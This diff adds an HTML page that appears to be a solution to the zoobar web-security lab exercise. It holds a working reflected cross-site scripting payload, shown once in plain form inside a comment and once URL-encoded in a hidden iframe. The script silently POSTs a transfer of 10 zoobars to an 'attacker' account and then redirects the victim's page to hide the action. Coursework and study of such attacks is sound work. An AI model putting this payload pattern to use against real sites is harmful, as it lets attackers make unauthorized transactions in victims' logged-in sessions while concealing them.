@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title></title>
+</head>
+<body>
+<!-- escape double quotes and angle brackets, then URL encoded it
+Add before: %5C%22%20size%3D10%5C%3E
+Add after:%3Cinput%20type%3D%5C%22hidden
+<script type="text/javascript">
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http://zoobar.org/transfer.php", true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xhr.send("zoobars=10&recipient=attacker&submission=Send");
+	// Simulate an HTTP redirect:
+	xhr.onload = function (e) {
+	  if (xhr.readyState === 4) {
+	    if (xhr.status === 200) {
+	      console.log(xhr.responseText);
+	      // async event listener
+	      top.window.location.replace("https://www.google.com");
+	    } else {
+	      console.error(xhr.statusText);
+	    }
+	  }
+	};
+</script>
+-->
+<iframe style="display: none;" src="http://zoobar.org/users.php?user=%5C%22%20size%3D10%5C%3E%5C%3Cscript%20type%3D%5C%22text%2Fjavascript%5C%22%5C%3E%0A%09var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09xhr.open%28%5C%22POST%5C%22%2C%20%5C%22http%3A%2F%2Fzoobar.org%2Ftransfer.php%5C%22%2C%20true%29%3B%0A%09xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application%2Fx-www-form-urlencoded%27%29%3B%0A%09xhr.send%28%5C%22zoobars%3D10%26recipient%3Dattacker%26submission%3DSend%5C%22%29%3B%0A%09%2F%2F%20Simulate%20an%20HTTP%20redirect%3A%0A%09xhr.onload%20%3D%20function%20%28e%29%20%7B%0A%09%20%20if%20%28xhr.readyState%20%3D%3D%3D%204%29%20%7B%0A%09%20%20%20%20if%20%28xhr.status%20%3D%3D%3D%20200%29%20%7B%0A%09%20%20%20%20%20%20console.log%28xhr.responseText%29%3B%0A%09%20%20%20%20%20%20%2F%2F%20async%20event%20listener%0A%09%20%20%20%20%20%20top.window.location.replace%28%5C%22https%3A%2F%2Fwww.google.com%5C%22%29%3B%0A%09%20%20%20%20%7D%20else%20%7B%0A%09%20%20%20%20%20%20console.error%28xhr.statusText%29%3B%0A%09%20%20%20%20%7D%0A%09%20%20%7D%0A%09%7D%3B%0A%5C%3C%2Fscript%5C%3E%3Cinput%20type%3D%5C%22hidden"></iframe>
+
+</body>
+</html>
